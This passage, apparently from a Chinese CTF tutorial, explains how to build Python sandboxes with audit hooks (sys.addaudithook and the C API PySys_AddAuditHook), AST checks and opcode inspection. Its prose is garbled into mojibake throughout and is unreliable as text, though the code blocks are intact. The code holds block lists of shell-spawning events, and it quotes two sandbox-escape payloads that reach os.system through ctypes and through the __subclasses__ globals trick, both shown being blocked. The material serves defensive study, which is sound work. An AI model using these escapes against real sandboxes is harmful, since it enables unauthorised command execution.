<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_hook</span>(<span class="params">event, args</span>):</span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;open&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Opening file: <span class="subst">&#123;args&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys.addaudithook(audit_hook)</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åï¼Œå¦‚æœè¿è¡Œ <code>open(&#39;myfile.txt&#39;)</code>ï¼Œå°±ä¼šå¾—åˆ° <code>Opening file: (&#39;myfile.txt&#39;,)</code> è¿™æ ·çš„è¾“å‡ºã€‚</p>
<h3 id="sys-addaudithook-æ„å»ºæ²™ç®±"><a href="#sys-addaudithook-æ„å»ºæ²™ç®±" class="headerlink" title="sys.addaudithook æ„å»ºæ²™ç®±"></a>sys.addaudithook æ„å»ºæ²™ç®±</h3><p>åœ¨ä¸€äº›æ²™ç®±çš„é¢˜ç›®ä¸­ä¹Ÿä¼šä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œä¾‹å¦‚ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    ...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, _</span>):</span><br><span class="line">    BALCKED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.exec&#x27;</span>, <span class="string">&#x27;os.posix_spawn&#x27;</span>,<span class="string">&#x27;os.spawn&#x27;</span>,<span class="string">&#x27;subprocess.Popen&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">in</span> BALCKED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation banned: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(event))</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">sys.addaudithook(my_audit_hook)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªæ²™ç®±å¯¹<code>&#39;pty.spawn&#39;, &#39;os.system&#39;, &#39;os.exec&#39;, &#39;os.posix_spawn&#39;,&#39;os.spawn&#39;,&#39;subprocess.Popen&#39;</code> è¿™äº›å‡½æ•°è¿›è¡Œäº†é™åˆ¶ï¼Œä¸€æ—¦è°ƒç”¨åˆ™æŠ›å‡ºå¼‚å¸¸.</p>
<p>ç™½åå•æ¯”é»‘åå•çš„é™åˆ¶æ›´å¤§,ä¸‹é¢çš„æ²™ç®±åªå…è®¸ input exec compile ç­‰å‡½æ•°çš„è°ƒç”¨ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">my_event, _</span>):</span><br><span class="line">    WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> my_event <span class="keyword">not</span> <span class="keyword">in</span> WHITED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation not permitted: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_event))</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<p>ä¸€èˆ¬çš„ payload æ— æ³•ä½¿ç”¨ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br><span class="line">Operation <span class="keyword">not</span> permitted: <span class="keyword">import</span></span><br><span class="line">&gt; [ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">Operation <span class="keyword">not</span> permitted: os.system</span><br></pre></td></tr></table></figure></div>

<h3 id="PySys-AddAuditHook-æ„å»ºæ²™ç®±"><a href="#PySys-AddAuditHook-æ„å»ºæ²™ç®±" class="headerlink" title="PySys_AddAuditHook æ„å»ºæ²™ç®±"></a>PySys_AddAuditHook æ„å»ºæ²™ç®±</h3><p><strong><code>PySys_AddAuditHook</code> æ˜¯ CPython æä¾›çš„ C çº§å®¡è®¡é’©å­æ³¨å†Œæ¥å£ï¼ˆè§ PEP 578ï¼‰</strong>ã€‚ä½ åœ¨ C é‡Œå®ç°ä¸€ä¸ªå›è°ƒï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*Py_AuditHookFunction)</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *event, PyObject *args, <span class="type">void</span> *userData)</span>;</span><br></pre></td></tr></table></figure></div>

<p>ç„¶ååœ¨ <strong>åˆå§‹åŒ– Python è§£é‡Šå™¨ä¹‹å‰</strong> è°ƒç”¨ <code>PySys_AddAuditHook</code> æŠŠè¿™ä¸ªå›è°ƒæ³¨å†Œè¿›å»ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">PySys_AddAuditHook</span><span class="params">(Py_AuditHookFunction hook, <span class="type">void</span> *userData)</span>;</span><br></pre></td></tr></table></figure></div>

<p><code>PySys_AddAuditHook</code> æ˜¯ <strong>CPython æä¾›çš„ä¸€ä¸ª C API</strong>ï¼ˆPEP 578 å®šä¹‰çš„ï¼‰ï¼Œå®ƒä¸æ˜¯ä¸€ä¸ª Python è„šæœ¬ã€ä¹Ÿä¸æ˜¯ç¬¬ä¸‰æ–¹æ’ä»¶ï¼Œè€Œæ˜¯<strong>åµŒå…¥åˆ° CPython è§£é‡Šå™¨é‡Œçš„ C å‡½æ•°</strong>ã€‚</p>
<blockquote>
<p>Python è§£é‡Šå™¨çš„æ ¸å¿ƒé€»è¾‘ï¼ˆç¼–è¯‘ã€æ‰§è¡Œã€å†…å­˜ç®¡ç†ã€å¯¼å…¥æ¨¡å—ç­‰ï¼‰å…¶å®æ˜¯ä¸€ä¸ª <strong>C è¯­è¨€å†™çš„åº“</strong>ï¼Œä¸€èˆ¬å«åšï¼š</p>
<ul>
<li>Linux&#x2F;macOS ä¸Šï¼š<code>libpython3.x.so</code>ï¼ˆåŠ¨æ€é“¾æ¥åº“ï¼‰</li>
<li>Windows ä¸Šï¼š<code>python3x.dll</code>ï¼ˆDLL åŠ¨æ€åº“ï¼‰</li>
</ul>
<p>å¹³æ—¶ä½ åœ¨ç»ˆç«¯æ•²çš„ <code>python3</code> è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå…¶å®åªæ˜¯ä¸€ä¸ª<strong>å¾ˆè–„çš„å¤–å£³</strong>ï¼Œå®ƒåœ¨ <code>main()</code> å‡½æ•°é‡Œè°ƒç”¨è¿™ä¸ªåº“é‡Œçš„ APIï¼Œæ¯”å¦‚ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    Py_Initialize();   <span class="comment">// åˆå§‹åŒ–è§£é‡Šå™¨</span></span><br><span class="line">    PyRun_AnyFile(...); <span class="comment">// è¿è¡Œäº¤äº’æ¨¡å¼æˆ–è„šæœ¬</span></span><br><span class="line">    Py_Finalize();     <span class="comment">// æ”¶å°¾</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ‰€ä»¥ä½ å®Œå…¨å¯ä»¥ç”¨ C ä»£ç è‡ªå·±å†™ä¸€ä¸ªâ€œè‡ªå·±çš„è§£é‡Šå™¨å…¥å£â€ã€‚è¿™æ ·ä½ å°±èƒ½åœ¨ <code>Py_Initialize()</code> ä¹‹å‰æ’é’©å­ï¼ˆ<code>PySys_AddAuditHook</code>ï¼‰ã€‚ç¼–è¯‘å‡ºæ¥çš„å¯æ‰§è¡Œæ–‡ä»¶å°±èƒ½è·‘ Python ä»£ç ï¼Œä½†å¸¦ç€ä½ è‡ªå·±åŠ çš„å®‰å…¨ç­–ç•¥ï¼ŒPython è„šæœ¬é‡Œåˆ ä¸æ‰å®ƒã€‚</p>
</blockquote>
<p>ä¹‹æ‰€ä»¥è¦åœ¨ <code>Py_Initialize()</code> <strong>ä¹‹å‰</strong>å®‰è£…ï¼Œæ˜¯ä¸ºäº†<strong>æ•è·å¹¶æ§åˆ¶è§£é‡Šå™¨å¯åŠ¨æ—©æœŸ</strong>çš„æ‰€æœ‰å®¡è®¡äº‹ä»¶ï¼ˆä¾‹å¦‚æ—©æœŸå¯¼å…¥ã€åˆå§‹åŒ–æ­¥éª¤ç­‰ï¼‰ï¼›å¦‚æœç­‰åˆå§‹åŒ–åæ‰è£…ï¼Œå¯åŠ¨é˜¶æ®µå·²ç»å‘ç”Ÿçš„é‚£äº›äº‹ä»¶ä½ å°±çœ‹ä¸åˆ°äº†ã€‚</p>
<p>è¿™ä¸ªé’©å­æ˜¯<strong>è¿›ç¨‹çº§åˆ«</strong>çš„ï¼šå®‰è£…åå¯¹å½“å‰è¿›ç¨‹é‡Œçš„æ‰€æœ‰å­è§£é‡Šå™¨éƒ½ç”Ÿæ•ˆï¼›åŒæ—¶å®ƒ<strong>ä¸å¯ç§»é™¤</strong>ï¼Œè¿™èƒ½é˜²æ­¢è¿è¡ŒæœŸçš„æ¶æ„ä»£ç æŠŠå®¡è®¡å¸æ‰ã€‚å½“æŸä¸ªäº‹ä»¶è§¦å‘ä½ çš„å›è°ƒæ—¶ï¼Œ<strong>å¦‚æœä½ æƒ³é˜»æ–­è¯¥æ“ä½œ</strong>ï¼Œå°±å…ˆç”¨è¯¸å¦‚ <code>PyErr_SetString(PyExc_RuntimeError, &quot;blocked&quot;)</code> ä¹‹ç±»çš„ API <strong>è®¾ç½®ä¸€ä¸ª Python å¼‚å¸¸</strong>ï¼Œå†è®©å›è°ƒ<strong>è¿”å›é 0ï¼ˆé€šå¸¸è¿”å› -1ï¼‰</strong>ï¼Œè§£é‡Šå™¨å°±ä¼šä»¥è¿™ä¸ªå¼‚å¸¸æ‹’ç»ç»§ç»­æ‰§è¡Œè¯¥äº‹ä»¶ã€‚</p>
<p>ä¸ä¹‹å¯¹æ¯”ï¼Œ<code>sys.addaudithook</code> æ˜¯<strong>Python å±‚</strong>åœ¨è¿è¡Œæ—¶æ³¨å†Œçš„é’©å­ï¼Œå®‰è£…æ—¶æœºé€šå¸¸æ›´æ™šã€å¯è§æ€§æ›´é«˜ï¼Œé€‚åˆåº”ç”¨å†…çš„å®¡è®¡æˆ–è®°å½•ï¼›è€Œ<strong>å¦‚æœä½ çš„ç›®æ ‡æ˜¯åœ¨â€œä¸€åˆ‡å‘ç”Ÿä¹‹å‰â€å°±æ‹¦ä½æ•æ„Ÿç‚¹ï¼ˆåŒ…æ‹¬å¯åŠ¨ä¸æ—©æœŸå¯¼å…¥ï¼‰</strong>ï¼Œæˆ–å¸Œæœ›é’©å­å¯¹ Python ä»£ç ä¸å¯è§ã€ä¸å¯å¸ï¼Œ**ä¼˜å…ˆé€‰æ‹© C çº§çš„ <code>PySys_AddAuditHook</code>**ã€‚</p>
<p>ä¾‹å¦‚ä¸‹é¢è¿™æ®µç¤ºä¾‹ä»£ç å¯ä»¥é˜»æ–­ <code>import</code>ã€<code>os.system</code>ã€<code>subprocess.Popen</code> ç­‰äº‹ä»¶ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// audit_hook.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PY_SSIZE_T_CLEAN</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Python.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_audit_hook</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *event, PyObject *args, <span class="type">void</span> *ud)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(event, <span class="string">&quot;os.system&quot;</span>) == <span class="number">0</span></span><br><span class="line">     || <span class="built_in">strcmp</span>(event, <span class="string">&quot;subprocess.Popen&quot;</span>) == <span class="number">0</span></span><br><span class="line">     || <span class="built_in">strcmp</span>(event, <span class="string">&quot;os.exec&quot;</span>) == <span class="number">0</span></span><br><span class="line">     || <span class="built_in">strcmp</span>(event, <span class="string">&quot;os.posix_spawn&quot;</span>) == <span class="number">0</span></span><br><span class="line">     || <span class="built_in">strcmp</span>(event, <span class="string">&quot;os.spawn&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        PyErr_SetString(PyExc_RuntimeError, <span class="string">&quot;blocked by C audit hook&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// é˜»æ–­å±é™©æ“ä½œ</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;       <span class="comment">// å…¶ä»–æ“ä½œæ”¾è¡Œ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 1) åœ¨åˆå§‹åŒ–ä¹‹å‰è£…é’©å­</span></span><br><span class="line">    PySys_AddAuditHook(my_audit_hook, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) å‘Šè¯‰è§£é‡Šå™¨è¿›å…¥äº¤äº’æ¨¡å¼</span></span><br><span class="line">    <span class="comment">//   ï¼ˆåœ¨ TTY ä¸‹å…¶å®ä¸è®¾ä¹Ÿä¼šè¿›å…¥ï¼›è®¾ä¸Šæ›´ä¿é™©ï¼‰</span></span><br><span class="line">    Py_InteractiveFlag = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) åˆå§‹åŒ–è§£é‡Šå™¨</span></span><br><span class="line">    Py_Initialize();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) æ‰“ä¸ªæç¤º</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,</span><br><span class="line">        <span class="string">&quot;== C-audited Python REPL ==\n&quot;</span></span><br><span class="line">        <span class="string">&quot;è¯•ç€æ‰§è¡Œ: import os; os.system(&#x27;id&#x27;)ï¼Œä¼šè¢«æ‹¦æˆªã€‚\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Ctrl-D é€€å‡ºã€‚\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) è¿›å…¥äº¤äº’ REPLï¼ˆä» stdin è¯»å¹¶æ‰§è¡Œï¼‰</span></span><br><span class="line">    <span class="comment">//    å¦‚æœä½ çš„ Python ç‰ˆæœ¬ä¸æ”¯æŒè¿™ä¸ªå‡½æ•°ï¼Œå¯ç”¨ PyRun_InteractiveLoop æ›¿ä»£</span></span><br><span class="line">    PyRun_AnyFile(<span class="built_in">stdin</span>, <span class="string">&quot;&lt;stdin&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) æ”¶å°¾</span></span><br><span class="line">    <span class="keyword">if</span> (Py_FinalizeEx() &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">120</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç¼–è¯‘å‘½ä»¤ï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install python3.10-dev  <span class="comment"># ç‰ˆæœ¬å·æŒ‰ä½ ç³»ç»Ÿçš„ Python ç‰ˆæœ¬æ”¹</span></span><br><span class="line">cc audit_hook.c -o audit_hook $(python3-config --embed --cflags --ldflags)</span><br><span class="line">./audit_hook</span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œç»“æœï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">== C-audited Python REPL ==</span><br><span class="line">è¯•ç€æ‰§è¡Œ: <span class="keyword">import</span> os; os.system(<span class="string">&#x27;id&#x27;</span>)ï¼Œä¼šè¢«æ‹¦æˆªã€‚</span><br><span class="line">Ctrl-D é€€å‡ºã€‚</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">RuntimeError: blocked by C audit hook</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="åŸºäº-AST-çš„æ²™ç®±"><a href="#åŸºäº-AST-çš„æ²™ç®±" class="headerlink" title="åŸºäº AST çš„æ²™ç®±"></a>åŸºäº AST çš„æ²™ç®±</h2><p>Python çš„æŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼ŒAbstract Syntax Treeï¼‰æ˜¯ä¸€ç§ç”¨æ¥è¡¨ç¤º Python æºä»£ç çš„æ ‘çŠ¶ç»“æ„ã€‚åœ¨è¿™ä¸ªæ ‘çŠ¶ç»“æ„ä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½ä»£è¡¨æºä»£ç ä¸­çš„ä¸€ç§ç»“æ„ï¼Œå¦‚ä¸€ä¸ªå‡½æ•°è°ƒç”¨ã€ä¸€ä¸ªæ“ä½œç¬¦ã€ä¸€ä¸ªå˜é‡ç­‰ã€‚Python çš„ ast æ¨¡å—æä¾›äº†ä¸€ç§æœºåˆ¶æ¥è§£æ Python æºä»£ç å¹¶ç”Ÿæˆè¿™æ ·çš„æŠ½è±¡è¯­æ³•æ ‘ã€‚ ä¸‹é¢æ˜¯Python <code>ast</code>æ¨¡å—çš„ä¸€äº›å¸¸è§èŠ‚ç‚¹ç±»å‹ï¼š</p>
<ul>
<li><code>ast.Module</code>: è¡¨ç¤ºä¸€ä¸ªæ•´ä¸ªçš„æ¨¡å—æˆ–è€…è„šæœ¬ã€‚</li>
<li><code>ast.FunctionDef</code>: è¡¨ç¤ºä¸€ä¸ªå‡½æ•°å®šä¹‰ã€‚</li>
<li><code>ast.AsyncFunctionDef</code>: è¡¨ç¤ºä¸€ä¸ªå¼‚æ­¥å‡½æ•°å®šä¹‰ã€‚</li>
<li><code>ast.ClassDef</code>: è¡¨ç¤ºä¸€ä¸ªç±»å®šä¹‰ã€‚</li>
<li><code>ast.Return</code>: è¡¨ç¤ºä¸€ä¸ªreturnè¯­å¥ã€‚</li>
<li><code>ast.Delete</code>: è¡¨ç¤ºä¸€ä¸ªdelè¯­å¥ã€‚</li>
<li><code>ast.Assign</code>: è¡¨ç¤ºä¸€ä¸ªèµ‹å€¼è¯­å¥ã€‚</li>
<li><code>ast.AugAssign</code>: è¡¨ç¤ºä¸€ä¸ªå¢é‡èµ‹å€¼è¯­å¥ï¼Œå¦‚<code>x += 1</code>ã€‚</li>
<li><code>ast.For</code>: è¡¨ç¤ºä¸€ä¸ªforå¾ªç¯ã€‚</li>
<li><code>ast.While</code>: è¡¨ç¤ºä¸€ä¸ªwhileå¾ªç¯ã€‚</li>
<li><code>ast.If</code>: è¡¨ç¤ºä¸€ä¸ªifè¯­å¥ã€‚</li>
<li><code>ast.With</code>: è¡¨ç¤ºä¸€ä¸ªwithè¯­å¥ã€‚</li>
<li><code>ast.Raise</code>: è¡¨ç¤ºä¸€ä¸ªraiseè¯­å¥ã€‚</li>
<li><code>ast.Try</code>: è¡¨ç¤ºä¸€ä¸ªtry&#x2F;exceptè¯­å¥ã€‚</li>
<li><code>ast.Import</code>: è¡¨ç¤ºä¸€ä¸ªimportè¯­å¥ã€‚</li>
<li><code>ast.ImportFrom</code>: è¡¨ç¤ºä¸€ä¸ªfromâ€¦importâ€¦è¯­å¥ã€‚</li>
<li><code>ast.Expr</code>: è¡¨ç¤ºä¸€ä¸ªè¡¨è¾¾å¼ã€‚</li>
<li><code>ast.Call</code>: è¡¨ç¤ºä¸€ä¸ªå‡½æ•°è°ƒç”¨ã€‚</li>
<li><code>ast.Name</code>: è¡¨ç¤ºä¸€ä¸ªå˜é‡åã€‚</li>
<li><code>ast.Attribute</code>: è¡¨ç¤ºä¸€ä¸ªå±æ€§å¼•ç”¨ï¼Œå¦‚<code>x.y</code>ã€‚</li>
</ul>
<p>ä»¥ä¸Šåˆ—ä¸¾çš„åªæ˜¯<code>ast</code>æ¨¡å—ä¸­ä¸€éƒ¨åˆ†çš„èŠ‚ç‚¹ç±»å‹ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–ç±»å‹çš„èŠ‚ç‚¹ã€‚æ›´è¯¦ç»†çš„åˆ—è¡¨å¯ä»¥åœ¨Pythonå®˜æ–¹æ–‡æ¡£çš„<code>ast</code>æ¨¡å—éƒ¨åˆ†æ‰¾åˆ°ã€‚</p>
<p>ä¸€äº› CTF é¢˜ç›®å°±é‡‡ç”¨äº†æ£€æŸ¥ AST èŠ‚ç‚¹æ„å»ºæ²™ç®±, ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹. åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­, verify_secure å‡½æ•°å¯¹ compile ä¹‹åçš„ä»£ç è¿›è¡Œæ ¡éªŒ, ç¦æ­¢ ast.Import</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">    <span class="keyword">match</span> <span class="built_in">type</span>(x):</span><br><span class="line">      <span class="keyword">case</span> (ast.Import|ast.ImportFrom|ast.Call):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned statement <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">abspath = os.path.abspath(__file__)</span><br><span class="line">dname = os.path.dirname(abspath)</span><br><span class="line">os.chdir(dname)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-- Please enter code (last line must contain only --END)&quot;</span>)</span><br><span class="line">source_code = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  line = sys.stdin.readline()</span><br><span class="line">  <span class="keyword">if</span> line.startswith(<span class="string">&quot;--END&quot;</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  source_code += line</span><br><span class="line"></span><br><span class="line">tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line"><span class="keyword">if</span> verify_secure(tree):  <span class="comment"># Safe to execute!</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;-- Executing safe code:&quot;</span>)</span><br><span class="line">  compiled = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">  <span class="built_in">exec</span>(compiled)</span><br></pre></td></tr></table></figure></div>

<h2 id="åŸºäº-opcode-çš„æ²™ç®±"><a href="#åŸºäº-opcode-çš„æ²™ç®±" class="headerlink" title="åŸºäº opcode çš„æ²™ç®±"></a>åŸºäº opcode çš„æ²™ç®±</h2><h3 id="å­—èŠ‚ç æ¦‚å¿µ"><a href="#å­—èŠ‚ç æ¦‚å¿µ" class="headerlink" title="å­—èŠ‚ç æ¦‚å¿µ"></a>å­—èŠ‚ç æ¦‚å¿µ</h3><p>Python æºä»£ç ä¼šå…ˆè¢«ç¼–è¯‘æˆä¸€ç§ä¸­é—´è¡¨ç¤ºå½¢å¼â€”â€”<strong>å­—èŠ‚ç ï¼ˆBytecodeï¼‰</strong>ï¼Œå®ƒæ˜¯ Python è™šæ‹Ÿæœºï¼ˆPVMï¼‰å¯ç›´æ¥æ‰§è¡Œçš„æŒ‡ä»¤é›†ã€‚å­—èŠ‚ç ç”±ä¸€ç³»åˆ— <strong>æ“ä½œç ï¼ˆopcodeï¼‰</strong> ç»„æˆï¼Œä¸å¹³å°æ— å…³ï¼Œåªè¦æœ‰ç›¸åº”ç‰ˆæœ¬çš„ Python è§£é‡Šå™¨éƒ½èƒ½æ‰§è¡Œã€‚</p>
